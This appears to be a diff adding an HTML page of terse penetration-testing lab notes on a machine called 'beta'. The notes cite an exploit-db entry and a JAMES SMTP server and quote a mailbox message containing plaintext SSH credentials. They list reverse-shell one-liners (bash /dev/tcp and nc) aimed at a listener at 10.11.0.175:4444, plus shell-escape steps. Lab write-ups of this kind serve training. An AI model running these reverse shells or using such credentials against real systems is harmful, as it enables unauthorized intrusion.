@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.72 beta</title>
+</head><body><br/>
+https://www.exploit-db.com/exploits/35513/<br/>
+<br/>
+use creds below to ssh, then run break out of jail from internet to get shell, then priv esc...<br/>
+<br/>
+Found below message in pop3 through telnet<br/>
+<br/>
+used creds to login to server through ssh<br/>
+<br/>
+reverse shell ran as soon as i auth'd....<br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+<br/>
+RETR 1<br/>
++OK Message follows<br/>
+Return-Path: &lt;mailadmin@localhost&gt;<br/>
+Message-ID: &lt;19262980.2.1420734423735.JavaMail.root@pop3&gt;<br/>
+MIME-Version: 1.0<br/>
+Content-Type: text/plain; charset=us-ascii<br/>
+Content-Transfer-Encoding: 7bit<br/>
+Delivered-To: ryuu@localhost<br/>
+Received: from localhost ([127.0.0.1])<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; by pop3 (JAMES SMTP Server 2.3.2) with SMTP ID 874<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for &lt;ryuu@localhost&gt;;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Thu, 8 Jan 2015 11:27:01 -0500 (EST)<br/>
+Date: Thu, 8 Jan 2015 11:27:01 -0500 (EST)<br/>
+From: mailadmin@localhost<br/>
+Dear Ryuu,<br/>
+<br/>
+Here are your ssh credentials to access the system. Remember to reset your password after your first login.<br/>
+Your access is restricted at the moment, feel free to ask your supervisor to add any command you need to your path.<br/>
+<br/>
+username: ryuu<br/>
+password: QUHqhUPRKXMo4m7k<br/>
+<br/>
+Kind regards,<br/>
+<br/>
+Matt<br/>
+.<br/>
+<br/>
+chsh -s /usr/local/bin/bash ryuu <br/>
+bash -i &gt;&amp; /dev/tcp/10.11.0.175/4444 0&gt;&amp;1<br/>
+chsh -s /bin/bash ryuu<br/>
+nc -c /bin/sh 10.11.0.175 4444<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+ryuu@beta:/bin$ export PATH=/bin:/usr/bin:$PATH </body></html>
